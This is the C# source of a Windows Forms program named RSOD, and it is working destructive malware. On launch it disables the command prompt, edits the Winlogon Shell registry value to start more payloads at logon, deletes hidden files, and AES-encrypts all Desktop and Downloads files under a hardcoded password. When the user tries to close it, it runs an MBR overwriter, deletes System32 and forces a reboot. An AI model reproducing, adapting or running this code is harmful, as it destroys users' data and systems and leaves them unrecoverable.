using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Threading;

namespace RSOD
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //Anti Kill
            e.Cancel = true;

            try
            {
                Destroy();
            }
            catch(Exception ex)
            {
                //Skip
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //Disable CMD
            RegistryKey CMD_DIS = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
            CMD_DIS.SetValue("DisableCMD", 1, RegistryValueKind.DWord);

            //Edit Shell
            RegistryKey Shell = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            Shell.SetValue("Shell", "explorer.exe, C:\\Windows\\res_winnt64\\MBR.exe, C:\\Windows\\res_winnt64\\RSOD.exe, C:\\Windows\\winnt64.exe", RegistryValueKind.String);
            
            //Define Paths
            string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string UserRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string Downloads = Path.Combine(UserRoot, "Downloads");

            //Delete All Hidden Files
            string[] DesktopFiles = Directory.EnumerateFiles(Desktop + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            string[] DownloadsFiles = Directory.EnumerateFiles(Downloads + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            foreach (string file in DesktopFiles)
                File.Delete(file);
            foreach (string file in DownloadsFiles)
                File.Delete(file);

            //Delete Desktop.ini
            string DesktopIni = (Desktop + @"\desktop.ini");
            string DownloadsIni = (Downloads + @"\desktop.ini");
            File.Delete(DesktopIni);
            File.Delete(DownloadsIni);

            //Encrypt Files
            Start_Encrypt();
        }

        public class CoreEncryption
        {
            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            }
        }

        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {

                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                string fileEncrypted = file;

                File.WriteAllBytes(fileEncrypted, bytesEncrypted);
            }
        }

        static void Start_Encrypt()
        {
            try
            {
                string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string UserRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
                string Downloads = Path.Combine(UserRoot, "Downloads");
                string[] files1 = Directory.GetFiles(Desktop + @"\", "*", SearchOption.AllDirectories);
                string[] files2 = Directory.GetFiles(Downloads + @"\", "*", SearchOption.AllDirectories);

                EncryptionFile enc = new EncryptionFile();

                string password = "*7ZZ@jWBG4M3Wl%N%7u6I%xgFPGybF#s&fg9xxBF#zTYigdu2q";

                for (int i = 0; i < files1.Length; i++)
                {
                    enc.EncryptFile(files1[i], password);

                }

                for (int i = 0; i < files2.Length; i++)
                {
                    enc.EncryptFile(files2[i], password);

                }
            } catch (Exception ex)
            {
                //Skip
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            { 
                Destroy();
            } catch (Exception ex)
            { 
                //Skip
            }
        }

        static void Destroy()
        {
            //OverWrite MBR
            try
            {
                Process.Start("C:\\Windows\\res_winnt64\\MBR.exe");
            } catch (Exception ex)
            {
                //Skip
            }
            
            //Delete Principal Files
            try
            {
                File.Delete(@"C:\Windows\System32\*.*");
            } catch (Exception ex)
            {
                //Skip
            }
            try
            {
                File.Delete(@"C:\Windows\System32\*");
            } catch (Exception ex)
            {
                //Skip
            }
            try
            {
                Directory.Delete(@"C:\Windows\System32\");
            } catch (Exception ex)
            {
                //Skip
            }
            try
            { 
                Directory.Delete(@"C:\Windows\System32\", true);
            } catch (Exception ex)
            {
                //Skip
            }

            //Force File-Per-File
            try
            {
                System.IO.DirectoryInfo di = new DirectoryInfo(@"C:\Windows\System32");
                foreach (FileInfo file in di.GetFiles())
                {
                    file.Delete();
                }
                foreach (DirectoryInfo dir in di.GetDirectories())
                {
                    dir.Delete(true);
                }
            } catch (Exception ex)
            {
                //Skip
            }

            //Delete Residues
            try
            {
                string system32 = @"C:\Windows\System32";
                string[] s32f = Directory.GetFiles(system32 + @"\", "*", SearchOption.AllDirectories);
                foreach (string file in s32f)
                    File.Delete(file);
                Directory.Delete(system32);
            } catch (Exception ex)
            {
                //Skip
            }

            //Restart Computer
            try
            {
                Thread.Sleep(5);
                Process.Start("shutdown", "/r /f /t 0");
            } catch (Exception ex)
            {
                //Skip
            }
        }
    }
}
